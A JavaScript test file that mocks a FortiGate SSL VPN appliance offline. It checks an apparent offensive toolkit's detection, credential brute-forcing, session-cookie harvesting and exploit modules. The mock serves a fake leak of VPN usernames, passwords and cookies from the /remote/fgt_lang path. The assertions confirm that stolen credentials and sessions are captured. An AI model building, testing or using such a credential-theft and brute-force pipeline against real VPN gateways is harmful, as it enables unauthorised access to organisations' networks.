'use strict';
// temp: local FortiGate mock to validate the whole cred pipeline offline
const http = require('http');
const assert = require('assert');
const store = require('../core/store');

const hits = [];

const server = http.createServer((req, res) => {
    const u = new URL(req.url, 'http://x');
    const p = u.pathname;
    const send = (code, body, headers = {}) => {
        res.writeHead(code, { 'Content-Type': 'text/html', ...headers });
        res.end(body);
    };

    if (p === '/remote/login') {
        return send(200, '<html><title>FortiGate-100D</title><script>top.location="/remote/login";</script>fortinet;remote/logincheck;hostcheck_install?auth_type</html>');
    }
    if (p === '/remote/fortisslvpn_xml') {
        return send(200, '<?xml version="1.0"?><sslvpn_connection><hostname>fw1</hostname><version>v6.4.5</version></sslvpn_connection>', { 'Content-Type': 'text/xml' });
    }
    if (p === '/remote/fgt_lang') {
        return send(200, 'p:1\x00svpnusername|admin\x00svpnpassword|OldPass\x00SVPNCOOKIE=leakedcookie123\x00');
    }
    if (p === '/api/v1/cmdb/system/admin') {
        return send(200, '{"results":[{"name":"admin","http_method":"GET","accprofile":"super_admin"}]}', { 'Content-Type': 'application/json' });
    }
    if (p === '/remote/index') {
        const c = req.headers.cookie || '';
        if (/SVPNCOOKIE=abc123/.test(c)) return send(200, '<html>svpn_logout welcome main.js</html>');
        return send(200, '<html><a href="/remote/login">login</a></html>');
    }
    if (p === '/remote/logincheck') {
        let body = '';
        req.on('data', c => body += c);
        req.on('end', () => {
            const q = new URLSearchParams(body);
            const user = q.get('username') || '';
            const pass = q.get('secretkey') || '';
            if (!user) return send(200, 'ret=0,redir=%2Fremote%2Flogin%3Ferr%3Dsslvpn_login_unknown_user');
            if (user === 'locked') return send(200, 'ret=0,redir=%2Fremote%2Flogin%3Ferr%3Dsslvpn_login_acct_locked');
            if (user === 'admin' && pass === 'Fortinet') {
                hits.push(user + ':' + pass);
                return send(200, 'ret=1,redir=%2Fremote%2Findex%2F', { 'Set-Cookie': 'SVPNCOOKIE=abc123; path=/; HttpOnly' });
            }
            return send(200, 'ret=0,redir=%2Fremote%2Flogin%3Ferr%3Dsslvpn_login_failed');
        });
        return;
    }
    send(404, 'nope');
});

server.listen(18080, '127.0.0.1', async () => {
    const forti = require('../core/forti');
    const bruter = require('../core/bruter');
    const exploiter = require('../core/exploiter');
    const results = [];
    const emit = (ev, data) => { if (/_hit$/.test(ev) || ev.endsWith('_cred')) results.push([ev, data]); };

    try {
        const info = await forti.detect('http://127.0.0.1:18080', { timeout: 4000 });
        console.log('detect:', info.forti, info.version, info.kind);
        assert.ok(info.forti, 'detect failed');

        const br = await bruter.run({
            targets: ['http://127.0.0.1:18080'], usernames: 'admin\nroot\nlocked',
            passwords: 'nope\nFortinet\nqwerty', mode: 'cross', threads: 6, perHost: 4, timeout: 4000, maxHits: 2, resume: false,
        }, emit, 'brute');
        console.log('brute:', JSON.stringify(br));
        const bh = results.filter(r => r[0] === 'brute_hit');
        assert.equal(bh.length, 1, 'expected exactly 1 brute hit, got ' + bh.length);
        assert.equal(bh[0][1].username, 'admin');
        assert.equal(bh[0][1].cookie, 'abc123');
        assert.equal(bh[0][1].verify, 'session_ok');

        results.length = 0;
        const ck = await bruter.run({
            targets: ['http://127.0.0.1:18080'], credentials: 'admin:Fortinet\nadmin:bad', threads: 4, timeout: 4000, resume: false,
        }, emit, 'check');
        console.log('check:', JSON.stringify(ck));
        assert.equal(results.filter(r => r[0] === 'check_hit').length, 1);

        const hs = await forti.harvestSession('http://127.0.0.1:18080', { timeout: 4000 });
        console.log('harvest:', hs && hs.creds);
        assert.ok(hs && hs.creds.length === 1 && hs.creds[0].user === 'admin');

        results.length = 0;
        const ex = await exploiter.run({ targets: ['http://127.0.0.1:18080'], threads: 2, timeout: 4000 }, emit, 'harvest');
        console.log('exploit:', JSON.stringify(ex), results.filter(r => r[0] === 'exploit_hit').length, 'hit events');
        assert.ok(ex.leaked >= 1, 'expected leaked cred');

        console.log('\nALL OK');
        store.flush();
        process.exit(0);
    } catch (e) {
        console.error('FAIL', e.message);
        process.exit(1);
    } finally {
        server.close();
    }
});
